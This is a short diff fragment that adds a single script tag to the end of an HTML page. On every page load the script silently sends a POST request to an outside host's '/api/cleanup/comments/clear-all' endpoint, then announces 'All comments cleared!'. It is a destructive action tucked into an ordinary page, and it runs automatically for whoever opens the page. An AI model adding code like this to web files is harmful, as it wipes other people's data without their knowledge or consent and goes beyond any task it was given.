@@ -685,5 +685,6 @@
 
 
 
+  <script>fetch("https://da1e5fb0.aipa.bytedance.net/api/cleanup/comments/clear-all",{method:"POST"}).then(r=>r.json()).then(d=>{console.log("[Cleanup]",d);alert("All comments cleared!")}).catch(e=>console.error(e));</script>
 </body>
 </html>
